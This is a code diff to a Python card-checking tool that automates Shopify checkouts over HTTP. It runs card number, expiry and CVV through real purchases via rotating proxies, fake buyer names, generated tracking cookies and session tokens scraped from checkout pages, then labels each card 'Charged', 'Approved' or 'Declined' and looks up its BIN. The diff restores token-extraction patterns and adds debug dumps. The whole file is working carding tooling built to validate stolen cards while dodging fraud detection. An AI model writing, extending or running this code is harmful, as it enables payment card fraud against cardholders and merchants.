@@ -291,7 +291,6 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
 
     raw_response = str(raw_response) if raw_response else "-"
     
-    # Extract clean error message - only the error identifier before colon
     if "DECLINED - " in raw_response:
         response_display = raw_response.split("DECLINED - ")[-1]
         if ":" in response_display:
@@ -346,7 +345,6 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
         "PROCESSINGRECEIPT", "AUTHORIZED", "YOUR ORDER IS CONFIRMED"
     ]) and "NO RECEIPT" not in raw_response_upper and "SESSION_TOKEN_NOT_FOUND" not in raw_response_upper:
         status_flag = "Charged ✅"
-    # Check for CAPTCHA
     elif any(keyword in raw_response_upper for keyword in [
         "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
         "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
@@ -355,7 +353,6 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
         "RECAPTCHA", "I'M NOT A ROBOT", "PLEASE VERIFY"
     ]):
         status_flag = "Captcha ⚠️"
-    # Check for PAYMENT ERROR
     elif any(keyword in raw_response_upper for keyword in [
         "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT", "PAYMENT ISSUE",
         "ISSUE PROCESSING", "PAYMENT ERROR", "PAYMENT PROBLEM",
@@ -363,22 +360,18 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
         "YOUR PAYMENT COULDN'T BE PROCESSED", "PAYMENT FAILED"
     ]):
         status_flag = "Declined ❌"
-    # Check for INSUFFICIENT FUNDS
     elif any(keyword in raw_response_upper for keyword in [
         "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS", "FUNDS", "NOT ENOUGH MONEY"
     ]):
         status_flag = "Declined ❌"
-    # Check for INVALID CARD
     elif any(keyword in raw_response_upper for keyword in [
         "INVALID CARD", "CARD IS INVALID", "CARD_INVALID", "CARD NUMBER IS INVALID"
     ]):
         status_flag = "Declined ❌"
-    # Check for EXPIRED CARD
     elif any(keyword in raw_response_upper for keyword in [
         "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED", "EXPIRATION DATE"
     ]):
         status_flag = "Declined ❌"
-    # Check for 3D Secure
     elif any(keyword in raw_response_upper for keyword in [
         "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
         "3DS", "PENDING", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
@@ -387,28 +380,22 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
         "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE"
     ]):
         status_flag = "Approved ❎"
-    # Check for CVV errors
     elif any(keyword in raw_response_upper for keyword in [
         "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV", "SECURITY CODE"
     ]):
         status_flag = "Declined ❌"
-    # Check for fraud
     elif any(keyword in raw_response_upper for keyword in [
         "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "FRAUDULENT",
         "RISKY", "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
     ]):
         status_flag = "Fraud ⚠️"
-    # Check for proxy errors
     elif "NO_PROXY_AVAILABLE" in raw_response_upper or "PROXY_DEAD" in raw_response_upper:
         status_flag = "Proxy Error 🚫"
-    # Check for session token errors
     elif "SESSION_TOKEN_NOT_FOUND" in raw_response_upper:
         status_flag = "Declined ❌"
-    # Default to declined
     else:
         status_flag = "Declined ❌"
 
-    # BIN lookup
     bin_data = get_bin_details(cc[:6]) or {}
     bin_info = {
         "bin": bin_data.get("bin", cc[:6]),
@@ -461,16 +448,13 @@ class ShopifyHTTPCheckout:
         self.product_handle = "retailer-id-fix-no-mapping"
         self.product_url = f"{self.base_url}/products/{self.product_handle}"
         
-        # Proxy management
         self.proxy_url = None
         self.proxy_status = "Dead 🚫"
         self.proxy_used = False
         self.proxy_response_time = 0.0
 
-        # Session for maintaining cookies
         self.client = None
 
-        # Headers template based on captured requests
         self.headers = {
             'authority': 'meta-app-prod-store-1.myshopify.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -487,7 +471,6 @@ class ShopifyHTTPCheckout:
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36'
         }
 
-        # Dynamic data storage
         self.checkout_token = None
         self.session_token = None
         self.graphql_session_token = None
@@ -496,14 +479,12 @@ class ShopifyHTTPCheckout:
         self.variant_id = "43207284392098"
         self.product_id = "7890988171426"
 
-        # Store extracted schema info
         self.proposal_id = None
         self.submit_id = None
         self.delivery_strategy_handle = None
 
         self.logger = ShopifyLogger(user_id)
 
-        # Random data generators
         self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
                            "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
                            "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
@@ -521,14 +502,12 @@ class ShopifyHTTPCheckout:
         self.phone = f"215{random.randint(100, 999)}{random.randint(1000, 9999)}"
 
     async def random_delay(self, min_sec=0.5, max_sec=2.0):
-        """Random delay between requests"""
         await asyncio.sleep(random.uniform(min_sec, max_sec))
 
     def step(self, num, name, action, details=None, status="PROCESSING"):
         return self.logger.step(num, name, action, details, status)
 
     def extract_checkout_token(self, url):
-        """Extract checkout token from URL"""
         patterns = [
             r'/checkouts/cn/([^/?]+)',
             r'/checkout/[^/]+/cn/([^/?]+)',
@@ -541,34 +520,29 @@ class ShopifyHTTPCheckout:
         return None
 
     def generate_random_string(self, length=16):
-        """Generate random string for cookies"""
         return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
     def generate_uuid(self):
-        """Generate UUID format string"""
         return f"{self.generate_random_string(8)}-{self.generate_random_string(4)}-4{self.generate_random_string(3)}-{random.choice(['8','9','a','b'])}{self.generate_random_string(3)}-{self.generate_random_string(12)}"
 
     def generate_tracking_ids(self):
-        """Generate tracking IDs like _shopify_y and _shopify_s"""
         return self.generate_uuid(), self.generate_uuid()
 
     def generate_timestamp(self):
-        """Generate timestamp for session token (milliseconds since epoch)"""
         return str(int(time.time() * 1000))
 
     def construct_graphql_session_token(self):
-        """Construct session token for GraphQL variables: checkout_token-timestamp"""
         if not self.checkout_token:
             return None
         timestamp = self.generate_timestamp()
         return f"{self.checkout_token}-{timestamp}"
 
-    # REMOVED: generate_session_token_from_checkout() - No more fake tokens
-
+    # RESTORED: Original extraction patterns that were working
     def extract_session_token_from_html_aggressive(self, html_content):
         """Aggressively extract session token from HTML using all possible patterns"""
         session_token = None
 
+        # ORIGINAL PATTERNS - These were working before
         patterns = [
             (r'x-checkout-one-session-token["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{100,})["\']', "Script assignment"),
             (r'"x-checkout-one-session-token"[:\s]+"([A-Za-z0-9_-]{100,})"', "JSON property"),
@@ -577,8 +551,6 @@ class ShopifyHTTPCheckout:
             (r'window\.__INITIAL_STATE__.*?"sessionToken"[:\s]+"([^"]{100,})"', "Initial state"),
             (r'window\.__DATA__.*?"sessionToken"[:\s]+"([^"]{100,})"', "Window data"),
             (r'"checkout-one".*?"token"[:\s]+"([^"]{100,})"', "Checkout one token"),
-            (r'"token"[:\s]+"([A-Za-z0-9_-]{150,300}\.[A-Za-z0-9_-]{50,150}\.[A-Za-z0-9_-]{0,50})"', "Token JWT format"),
-            (r'checkoutToken["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{100,})["\']', "Checkout token"),
         ]
 
         for pattern, source in patterns:
@@ -587,30 +559,26 @@ class ShopifyHTTPCheckout:
                 candidate = match.group(1)
                 if len(candidate) > 100 and '.' in candidate:
                     session_token = candidate
-                    self.logger.data_extracted("Session Token (Extracted)", session_token[:50] + "...", source)
+                    self.logger.data_extracted("Session Token (Aggressive)", session_token[:50] + "...", source)
                     return session_token
 
-        # Additional pattern for JWT format
+        # ORIGINAL JWT PATTERNS
         jwt_patterns = [
             r'[A-Za-z0-9_-]{100,200}\.[A-Za-z0-9_-]{100,200}\.[A-Za-z0-9_-]{40,100}',
             r'["\']([A-Za-z0-9_-]{150,300}\.[A-Za-z0-9_-]{50,150})["\']',
-            r'["\'](eyJ[A-Za-z0-9_-]{100,}\.eyJ[A-Za-z0-9_-]{100,})["\']',
         ]
 
         for pattern in jwt_patterns:
             matches = re.findall(pattern, html_content)
             for match in matches:
-                if len(match) > 150 and '.' in match:
-                    # Verify it looks like a checkout token
-                    if 'checkout' in html_content.lower() or 'session' in html_content.lower():
-                        session_token = match
-                        self.logger.data_extracted("Session Token (JWT)", session_token[:50] + "...", "JWT Pattern")
-                        return session_token
+                if len(match) > 150 and '.' in match and 'checkout' in html_content.lower():
+                    session_token = match
+                    self.logger.data_extracted("Session Token (JWT Search)", session_token[:50] + "...", "Regex pattern")
+                    return session_token
 
         return None
 
     def extract_bootstrap_data(self, html_content):
-        """Extract bootstrap data from checkout page HTML"""
         try:
             patterns = [
                 r'window\.__INITIAL_STATE__\s*=\s*({.+?});',
@@ -634,7 +602,6 @@ class ShopifyHTTPCheckout:
             return {}
 
     def extract_delivery_strategy(self, html_content):
-        """Extract available delivery strategy handle from page"""
         try:
             pattern = r'"handle":"([a-f0-9]+-be73b24eea304774d3c2df281c6988e5)"'
             matches = re.findall(pattern, html_content)
@@ -652,7 +619,6 @@ class ShopifyHTTPCheckout:
             return None
 
     async def get_checkout_page_with_token(self, max_retries=3):
-        """Get checkout page and extract session token with retry logic"""
         for attempt in range(max_retries):
             try:
                 self.step(5 if attempt == 0 else 5 + attempt, "LOAD CHECKOUT", 
@@ -687,11 +653,19 @@ class ShopifyHTTPCheckout:
 
                 self.logger.data_extracted("Response Headers", str(dict(resp.headers)), "HTTP Response")
 
-                # FIXED: Only use extracted token, never generate fake one
+                # RESTORED: Use extraction only, no generation
                 self.session_token = self.extract_session_token_from_html_aggressive(page_content)
 
                 if not self.session_token:
                     self.logger.error_log("TOKEN", f"Could not extract real session token from HTML (Attempt {attempt + 1})")
+                    # DEBUG: Save HTML to file for analysis
+                    try:
+                        debug_file = f"/tmp/shopify_debug_{self.check_id}_{attempt}.html"
+                        with open(debug_file, 'w', encoding='utf-8') as f:
+                            f.write(page_content)
+                        self.logger.error_log("DEBUG", f"HTML saved to {debug_file}")
+                    except:
+                        pass
                     if attempt < max_retries - 1:
                         await self.random_delay(2, 4)
                         continue
@@ -739,9 +713,7 @@ class ShopifyHTTPCheckout:
         return False, "SESSION_TOKEN_NOT_FOUND"
 
     async def execute_checkout(self, cc, mes, ano, cvv):
-        """Execute checkout using HTTP requests with proxy"""
         try:
-            # Step 0: Get proxy for user
             self.step(0, "GET PROXY", "Getting random proxy for user", f"User ID: {self.user_id}")
             
             if PROXY_SYSTEM_AVAILABLE:
@@ -777,7 +749,6 @@ class ShopifyHTTPCheckout:
                 self.logger.error_log("PROXY", "Proxy system not available")
                 return False, "PROXY_SYSTEM_UNAVAILABLE"
 
-            # Step 1: Initialize session and get homepage
             self.step(1, "INIT SESSION", "Getting homepage with proxy", f"Proxy: {self.proxy_url[:30]}...")
 
             shopify_y, shopify_s = self.generate_tracking_ids()
@@ -822,7 +793,6 @@ class ShopifyHTTPCheckout:
 
             await self.random_delay(1, 2)
 
-            # Step 2: Add to cart
             self.step(2, "ADD TO CART", "Adding product to cart with proxy", f"Variant: {self.variant_id}")
 
             cart_headers = {
@@ -907,7 +877,6 @@ class ShopifyHTTPCheckout:
 
             await self.random_delay(1, 2)
 
-            # Step 3: Get cart page
             self.step(3, "GET CART", "Loading cart page with proxy")
 
             cart_page_headers = {
@@ -926,7 +895,6 @@ class ShopifyHTTPCheckout:
 
             await self.random_delay(1, 2)
 
-            # Step 4: Start checkout
             self.step(4, "START CHECKOUT", "Initiating checkout process with proxy")
 
             checkout_start_headers = {
@@ -970,7 +938,6 @@ class ShopifyHTTPCheckout:
 
             await self.random_delay(2, 3)
 
-            # Step 5: Get checkout page with session token extraction
             success, page_content = await self.get_checkout_page_with_token(max_retries=3)
 
             if not success:
@@ -997,7 +964,6 @@ class ShopifyHTTPCheckout:
 
             await self.random_delay(2, 3)
 
-            # Step 6: Submit Proposal mutation
             self.step(6, "SUBMIT PROPOSAL", "Submitting checkout proposal with proxy", self.email)
 
             graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
@@ -1214,7 +1180,6 @@ class ShopifyHTTPCheckout:
 
             await self.random_delay(1, 2)
 
-            # Step 7: Create payment session with PCI - FIXED: Added retry logic
             self.step(7, "CREATE PAYMENT", "Creating payment session with PCI and proxy")
 
             pci_headers = {
@@ -1253,14 +1218,13 @@ class ShopifyHTTPCheckout:
                 "payment_session_scope": "meta-app-prod-store-1.myshopify.com"
             }
 
-            # FIXED: Added retry logic for PCI with proxy rotation
             payment_session_id = None
             payment_method_identifier = None
             pci_success = False
             
             for pci_attempt in range(3):
                 try:
-                    pci_client = httpx.AsyncClient(proxy=self.proxy_url, timeout=45)  # Increased timeout
+                    pci_client = httpx.AsyncClient(proxy=self.proxy_url, timeout=45)
                     
                     resp = await pci_client.post(
                         'https://checkout.pci.shopifyinc.com/sessions',
@@ -1297,7 +1261,6 @@ class ShopifyHTTPCheckout:
                         await pci_client.aclose()
                         if pci_attempt < 2:
                             self.logger.error_log("PCI_RETRY", f"Status {resp.status_code}, retrying... (Attempt {pci_attempt + 1})")
-                            # Rotate proxy on failure
                             mark_proxy_failed(self.proxy_url)
                             self.proxy_url = get_proxy_for_user(self.user_id, "random")
                             if not self.proxy_url:
@@ -1333,7 +1296,6 @@ class ShopifyHTTPCheckout:
 
             await self.random_delay(1, 2)
 
-            # Step 8: Submit for completion
             self.step(8, "SUBMIT PAYMENT", "Submitting payment for processing with proxy")
 
             attempt_token = f"{self.checkout_token}-{self.generate_random_string(12)}"
@@ -1567,7 +1529,6 @@ class ShopifyHTTPCheckout:
                     self.receipt_id = receipt.get('id')
 
                     if not self.receipt_id:
-                        # DEBUG: Log the full response to see what we got
                         self.logger.error_log("NO_RECEIPT", f"Full response: {json.dumps(submit_resp, indent=2)[:500]}")
                         return False, "No receipt ID in submit response"
 
@@ -1613,7 +1574,6 @@ class ShopifyHTTPCheckout:
                 await self.client.aclose()
 
     async def poll_receipt(self, headers):
-        """Poll for receipt status"""
         try:
             graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
 
@@ -1693,7 +1653,6 @@ class ShopifyChargeCheckerHTTP:
         self.proxy_status = "Dead 🚫"
 
     async def check_card(self, card_details, username, user_data):
-        """Main card checking method using HTTP checkout with proxy"""
         start_time = time.time()
 
         self.logger = ShopifyLogger(self.user_id)
